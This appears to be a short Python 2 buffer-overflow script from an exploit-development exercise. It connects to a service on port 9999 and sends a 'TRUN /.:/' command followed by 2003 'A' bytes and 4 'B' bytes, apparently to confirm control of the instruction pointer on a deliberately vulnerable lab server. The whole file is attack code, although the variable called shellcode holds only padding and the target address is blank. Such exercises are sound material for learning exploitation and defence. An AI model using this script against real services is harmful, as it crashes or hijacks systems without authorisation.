#! /usr/bin/python

import sys, socket 

# Enter the no of bytes 

shellcode = "A" * 2003 + "B" * 4
try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('' , 9999)) # windows ip and port to be given in 

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:

	print "Eroor connecting to the server "	
	sys.exit()

		
